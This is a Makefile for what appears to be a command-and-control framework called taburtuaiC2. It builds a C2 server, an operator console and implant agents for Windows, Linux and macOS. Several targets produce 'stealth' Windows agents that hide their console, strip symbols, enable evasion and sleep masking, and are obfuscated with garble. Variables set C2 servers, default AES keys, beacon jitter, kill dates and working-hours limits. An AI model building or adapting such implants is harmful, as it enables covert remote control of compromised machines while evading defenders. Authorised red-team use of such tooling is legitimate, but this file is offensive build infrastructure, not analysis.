# taburtuaiC2 Makefile
# Usage: make help

BINARY_DIR  := bin
SERVER_BIN  := $(BINARY_DIR)/server
OPERATOR_BIN := $(BINARY_DIR)/operator
AGENT_DIR   := ./agent

# Default C2 server (override via env or CLI)
C2_SERVER   ?= http://127.0.0.1:8080
ENC_KEY     ?= SpookyOrcaC2AES1
SEC_KEY     ?= TaburtuaiSecondary
INTERVAL    ?= 30
JITTER      ?= 20
KILL_DATE   ?=

# Build flags
GO          := go
GARBLE      := garble
LDFLAGS_BASE := -X main.serverURL=$(C2_SERVER) \
                -X main.encKey=$(ENC_KEY) \
                -X main.secondaryKey=$(SEC_KEY) \
                -X main.defaultInterval=$(INTERVAL) \
                -X main.defaultJitter=$(JITTER)

LDFLAGS_STRIP := $(LDFLAGS_BASE) -s -w
LDFLAGS_WIN   := $(LDFLAGS_STRIP) -H windowsgui

.PHONY: all server operator agent-windows agent-linux agent-darwin \
        agent-win-stealth agent-win-garble deps clean help

## ── Default ──────────────────────────────────────────────────────────────────

all: server operator agent-windows

## ── Server & Operator ────────────────────────────────────────────────────────

server: ## Build C2 server binary
	@mkdir -p $(BINARY_DIR)
	$(GO) build -o $(SERVER_BIN) ./cmd/server
	@echo "[+] Server: $(SERVER_BIN)"

operator: ## Build operator CLI binary
	@mkdir -p $(BINARY_DIR)
	$(GO) build -o $(OPERATOR_BIN) ./cmd/operator
	@echo "[+] Operator: $(OPERATOR_BIN)"

## ── Agent builds ─────────────────────────────────────────────────────────────

agent-windows: ## Build Windows agent (with console, for testing)
	@mkdir -p $(BINARY_DIR)
	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
	$(GO) build \
		-ldflags "$(LDFLAGS_BASE) -X main.defaultExecMethod=cmd" \
		-o $(BINARY_DIR)/agent_windows.exe \
		$(AGENT_DIR)
	@echo "[+] Windows agent: $(BINARY_DIR)/agent_windows.exe"

agent-win-stealth: ## Build Windows stealth agent (no console, stripped)
	@mkdir -p $(BINARY_DIR)
	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
	$(GO) build \
		-ldflags "$(LDFLAGS_WIN) \
			-X main.defaultExecMethod=powershell \
			-X main.defaultEnableEvasion=true \
			-X main.defaultSleepMasking=true \
			$(if $(KILL_DATE),-X main.defaultKillDate=$(KILL_DATE),)" \
		-o $(BINARY_DIR)/agent_windows_stealth.exe \
		$(AGENT_DIR)
	@echo "[+] Windows stealth: $(BINARY_DIR)/agent_windows_stealth.exe"

agent-win-garble: ## Build Windows agent with garble obfuscation (needs garble installed)
	@command -v $(GARBLE) >/dev/null 2>&1 || (echo "[-] garble not found: go install mvdan.cc/garble@latest" && exit 1)
	@mkdir -p $(BINARY_DIR)
	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
	$(GARBLE) -tiny -literals -seed=random build \
		-ldflags "$(LDFLAGS_WIN) \
			-X main.defaultExecMethod=powershell \
			-X main.defaultEnableEvasion=true \
			-X main.defaultSleepMasking=true" \
		-o $(BINARY_DIR)/agent_windows_obf.exe \
		$(AGENT_DIR)
	@echo "[+] Windows garble: $(BINARY_DIR)/agent_windows_obf.exe"

agent-linux: ## Build Linux agent
	@mkdir -p $(BINARY_DIR)
	GOOS=linux GOARCH=amd64 CGO_ENABLED=0 \
	$(GO) build \
		-ldflags "$(LDFLAGS_STRIP)" \
		-o $(BINARY_DIR)/agent_linux \
		$(AGENT_DIR)
	@echo "[+] Linux agent: $(BINARY_DIR)/agent_linux"

agent-darwin: ## Build macOS agent
	@mkdir -p $(BINARY_DIR)
	GOOS=darwin GOARCH=amd64 CGO_ENABLED=0 \
	$(GO) build \
		-ldflags "$(LDFLAGS_STRIP)" \
		-o $(BINARY_DIR)/agent_darwin \
		$(AGENT_DIR)
	@echo "[+] macOS agent: $(BINARY_DIR)/agent_darwin"

## ── Custom build with all flags exposed ──────────────────────────────────────

# Usage:
#   make agent-custom \
#     C2_SERVER=http://192.168.1.10:8080 \
#     ENC_KEY=MyKey12345678901 \
#     INTERVAL=60 JITTER=30 \
#     KILL_DATE=2026-12-31
agent-custom: ## Build Windows agent with custom parameters (see Makefile header for vars)
	@mkdir -p $(BINARY_DIR)
	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
	$(GO) build \
		-ldflags "$(LDFLAGS_WIN) \
			-X main.defaultExecMethod=powershell \
			-X main.defaultEnableEvasion=true \
			-X main.defaultSleepMasking=true \
			$(if $(KILL_DATE),-X main.defaultKillDate=$(KILL_DATE),) \
			$(if $(WORK_START),-X main.defaultWorkingHoursOnly=true,) \
			$(if $(WORK_START),-X main.defaultWorkingHoursStart=$(WORK_START),) \
			$(if $(WORK_END),-X main.defaultWorkingHoursEnd=$(WORK_END),)" \
		-o $(BINARY_DIR)/agent_custom.exe \
		$(AGENT_DIR)
	@echo "[+] Custom agent: $(BINARY_DIR)/agent_custom.exe"
	@echo "    Server  : $(C2_SERVER)"
	@echo "    Interval: $(INTERVAL)s / jitter: $(JITTER)%"
	@echo "    Kill    : $(KILL_DATE)"

## ── Utilities ────────────────────────────────────────────────────────────────

deps: ## Download and tidy Go modules
	$(GO) mod download
	$(GO) mod tidy
	@echo "[+] Dependencies ready"

build-check: ## Verify all packages compile (Windows + native)
	@echo "[*] Checking native build..."
	$(GO) build ./...
	@echo "[*] Checking windows/amd64 cross-compile..."
	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 $(GO) build ./...
	@echo "[+] All packages OK"

clean: ## Remove build artifacts
	rm -rf $(BINARY_DIR)
	@echo "[+] Cleaned"

run-server: server ## Build and run server
	./$(SERVER_BIN)

run-operator: operator ## Build and run operator console
	./$(OPERATOR_BIN) console --server $(C2_SERVER)

help: ## Show this help
	@echo ""
	@echo "  taburtuaiC2 — Build System"
	@echo ""
	@grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) | \
		awk 'BEGIN {FS = ":.*?## "}; {printf "  \033[36m%-22s\033[0m %s\n", $$1, $$2}'
	@echo ""
	@echo "  Variables (pass via make VAR=value):"
	@echo "  \033[33mC2_SERVER\033[0m   C2 URL              (default: http://127.0.0.1:8080)"
	@echo "  \033[33mENC_KEY\033[0m     AES key 16 chars    (default: SpookyOrcaC2AES1)"
	@echo "  \033[33mINTERVAL\033[0m    Beacon interval sec (default: 30)"
	@echo "  \033[33mJITTER\033[0m      Jitter percent      (default: 20)"
	@echo "  \033[33mKILL_DATE\033[0m   Kill date YYYY-MM-DD (empty = never)"
	@echo "  \033[33mWORK_START\033[0m  Working hours start  (0-23)"
	@echo "  \033[33mWORK_END\033[0m    Working hours end    (0-23)"
	@echo ""
	@echo "  Examples:"
	@echo "  \033[2mmake agent-win-stealth C2_SERVER=http://192.168.1.10:8080 ENC_KEY=MyKey1234567890 KILL_DATE=2026-12-31\033[0m"
	@echo "  \033[2mmake agent-custom C2_SERVER=https://c2.domain.com INTERVAL=300 JITTER=40 WORK_START=8 WORK_END=18\033[0m"
	@echo ""
